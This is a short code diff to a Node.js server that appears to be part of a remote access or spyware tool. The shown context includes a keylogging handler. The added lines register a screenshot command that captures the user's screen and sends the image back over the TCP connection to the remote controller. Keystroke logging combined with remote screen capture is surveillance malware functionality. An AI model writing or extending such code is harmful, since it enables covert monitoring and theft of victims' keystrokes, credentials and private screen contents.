@@ -246,3 +246,12 @@ server.on(Packets.KeylogSetup, function(packet, conn) {
   
   conn.tcp.__destructors.keylog = disableKeylog
 })
+
+
+const screenshot = require('./lib/Screenshot');
+server.on(Packets.Screenshot, async function(packet, conn) {
+  let screenshotData = await screenshot.screenshot();
+  conn.tcp.write(Packets.r_Screenshot.create(
+    screenshotData
+  ))
+})
